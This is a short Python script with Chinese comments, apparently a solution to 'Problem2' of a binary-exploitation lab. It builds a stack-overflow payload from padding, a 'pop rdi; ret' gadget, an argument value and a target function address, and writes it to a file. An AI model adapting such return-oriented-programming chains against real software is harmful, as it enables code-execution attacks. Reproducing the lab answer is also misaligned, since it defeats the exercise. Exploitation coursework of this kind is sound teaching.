PADDING_LEN = 16  # 缓冲区8字节 + saved rbp8字节
POP_RDI_RET = b"\xc7\x12\x40\x00\x00\x00\x00\x00"  # 0x4012c7（小端序）
FUNC2_ARG = b"\xf8\x03\x00\x00\x00\x00\x00\x00"    # 0x3f8（小端序）
FUNC2_ADDR = b"\x16\x12\x40\x00\x00\x00\x00\x00"   # 0x401216（小端序）

# 构造payload
padding = b"A" * PADDING_LEN
payload = padding + POP_RDI_RET + FUNC2_ARG + FUNC2_ADDR

# 保存为二进制文件
with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Problem2 payload已生成到ans2.txt")
print(f"Payload长度：{len(payload)} 字节") 